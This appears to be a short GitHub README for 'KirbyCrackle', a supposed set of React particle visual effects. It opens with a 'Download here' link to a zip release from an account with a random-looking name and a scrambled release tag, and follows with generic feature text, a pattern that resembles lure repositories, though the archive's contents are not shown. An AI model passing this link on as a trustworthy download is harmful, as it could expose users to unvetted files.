[Download here](https://github.com/usheenes89388u/Kirby-Crackle-Effect/releases/download/m4s1hm1lr4a/Kirby-Crackle-Effect.zip)

**KirbyCrackle** is a research-focused collection of particle-based visual effects designed for modern websites, interactive interfaces, and UI motion design.

This project demonstrates how crackle-style particle systems can enhance user attention, guide UX, and bring character to digital content — inspired by comic book FX and animation timing.

## 🎯 Purpose

To explore and showcase multiple styles of **crackle FX** through modular, reusable React components. Each effect is evaluated based on:

- Visual clarity
- UI integration
- Performance
- Ideal use cases

---

## ⚙️ Technologies Used

- `Vite + React` — Modern dev stack for fast prototyping
- `Custom ParticleEmitter` class — OOP logic for FX generation
- `CSS animations` with dynamic custom properties (`--x`, `--y`)
- Asset handling and scoped layout via modular components
